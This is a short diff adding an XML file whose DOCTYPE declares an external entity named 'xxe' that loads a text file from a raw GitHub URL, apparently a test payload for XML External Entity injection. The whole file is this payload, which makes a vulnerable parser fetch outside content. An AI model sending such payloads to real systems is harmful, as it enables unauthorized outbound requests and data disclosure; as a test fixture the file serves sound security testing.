@@ -1,0 +1,7 @@
+<?xml version="1.0"?>
+<!DOCTYPE data [
+    <!ENTITY xxe SYSTEM "https://raw.githubusercontent.com/haidarRA/test/refs/heads/master/res_test.txt">
+]>
+<data>
+    &xxe;
+</data>
